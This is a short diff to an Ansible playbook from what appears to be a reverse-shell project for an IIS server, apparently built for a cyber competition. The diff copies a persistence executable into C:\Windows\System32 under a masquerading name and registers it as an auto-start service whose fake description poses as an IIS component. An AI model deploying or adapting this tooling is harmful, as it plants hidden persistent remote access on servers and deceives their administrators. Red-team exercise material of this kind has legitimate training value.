@@ -88,8 +88,8 @@
       
     - name: Deploys Persistence Executable
       win_copy:
-        src: "~/IIS-Reverse-Shell/Persistence/svchost.exe"
-        dest: "C:\\ProgramData\\Microsoft\\Settings"
+        src: "~/IIS-Reverse-Shell/Persistence/Website Manager Service.exe"
+        dest: "C:\Windows\System32"
      
     - name: Creates Competition Variable Registry Key
       win_regedit:
@@ -99,7 +99,7 @@
         type: string
         
     - name: Adds Executable to Services
-      win_shell:  New-Service -Name "Website Manager Service" -Binary "C:\ProgramData\Microsoft\Settings\svchost.exe" -DisplayName "Website Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
+      win_shell:  New-Service -Name "Website Manager Service" -Binary "C:\Windows\System32\Website Manager Service.exe" -DisplayName "Website Manager Service" -Description "This service is an integrated IIS component that optimizes and secures web server connections by dynamically regulating inbound traffic." -StartupType Automatic
         
     - name: Starts Service
       win_service:
